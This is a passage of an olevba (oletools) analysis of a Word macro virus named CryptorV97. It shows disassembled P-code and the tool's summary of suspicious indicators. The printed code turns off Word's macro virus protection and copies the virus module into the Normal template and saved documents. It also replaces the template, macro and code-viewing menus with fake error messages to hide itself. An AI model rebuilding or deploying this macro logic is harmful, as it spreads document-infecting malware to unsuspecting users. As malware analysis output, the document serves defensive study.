' 	LitStr 0x0031 "Cryptage du document terminé..., HAHAHAHAHAHA!!!!"
' 	St StatusBar 
' Line #224:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #225:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #226:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #227:
' 	EndSelect 
' Line #228:
' 	Label ErrorAC 
' Line #229:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #230:
' 	EndSub 
' Line #231:
' 	FuncDefn (Sub FileSaveAs())
' Line #232:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #233:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #234:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #235:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #236:
' 	OnError ErrorFSA 
' Line #237:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #238:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #239:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #240:
' 	EndIfBlock 
' Line #241:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "CryptorV97"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #242:
' 	LitStr 0x0020 "ZeMacroKiller98 vous remercie..."
' 	Ld vbInformation 
' 	LitStr 0x0010 "Virus CryptorV97"
' 	ArgsCall MsgBox 0x0003 
' Line #243:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #244:
' 	Label ErrorFSA 
' Line #245:
' 	EndSub 
' Line #246:
' 	FuncDefn (Sub FileTemplates())
' Line #247:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #248:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #249:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #250:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #251:
' 	OnError ErrorFT 
' Line #252:
' 	LitStr 0x0018 "Espace pile insuffisant."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #253:
' 	Label ErrorFT 
' Line #254:
' 	EndSub 
' Line #255:
' 	FuncDefn (Sub ToolsMacro())
' Line #256:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #257:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #258:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #259:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #260:
' 	OnError ErrorTM 
' Line #261:
' 	LitStr 0x0017 "Fonction Sub non défini"
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #262:
' 	Label ErrorTM 
' Line #263:
' 	EndSub 
' Line #264:
' 	FuncDefn (Sub ViewVBCode())
' Line #265:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #266:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #267:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #268:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #269:
' 	OnError ErrorVVBC 
' Line #270:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #271:
' 	Label ErrorVVBC 
' Line #272:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

